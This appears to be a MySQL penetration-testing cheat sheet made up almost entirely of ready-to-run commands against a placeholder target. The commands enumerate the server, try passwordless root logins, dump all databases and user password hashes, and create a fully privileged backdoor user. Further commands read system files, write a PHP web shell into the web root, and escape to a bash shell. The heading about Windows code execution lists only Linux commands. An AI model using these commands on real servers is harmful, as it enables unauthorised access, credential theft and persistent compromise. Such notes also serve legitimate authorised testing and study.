

----
## MYSQL Pentesting

nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 TARGET_IP


##  MYSQL Version - MSF


use auxiliary/scanner/mysql/mysql_version



## Mysql client

mysql -h TARGET_IP
mysql -h TARGET_IP -u root
mysql -h TARGET_IP -u root@localhost
mysql -h TARGET_IP -u ""@localhost
mysql -h TARGET_IP -e "QUERY"
mysql -h TARGET_IP -u root -pPASSWORD -e "QUERY"


##  Run several sql commands concurrently

mysql -u username -p < manycommands.sql



##  SQL - Command History

cat ~/.mysql.history



##  SQL -  Dump DB

mysqldump -u USERNAME -p PASSWORD --all-databases --skip-lock-tables > dump.sql

mysqldump -u USERNAME -p PASSWORD DATABASE_NAME --skip-lock-tables > dump.sql




##  SQL - Queries

##  Enum SQL

SELECT version();
SELECT user();
SELECT database();
show databases;
SHOW TABLES;
SHOW TABLES FROM DATABASE_NAME;
SHOW Grants;
show variables;


##  DB user Info

SELECT user,password, file_priv FROM mysql.user;



##  SQL DB user Info

SELECT host, user, authentication_string from mysql.user;



##  SQL - Create a new user and grant him privileges

create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;



## Interact with OS


##  SQL - Read file

SELECT LOAD_FILE('FILE_PATH');


##  SQL - Read file BASE64

This is useful to read a php file while doing sqli

SELECT BASE64(LOAD_FILE('FILE_PATH'));


##  SQL -  Write file

SELECT "<?php echo system($_GET['cmd']);?>" into OUTFILE '/var/www/html/shell.php'


##  SQL - Remote Code Execution (Windows)


### Linux

mysql> \! cat /etc/passwd
mysql> \! bash
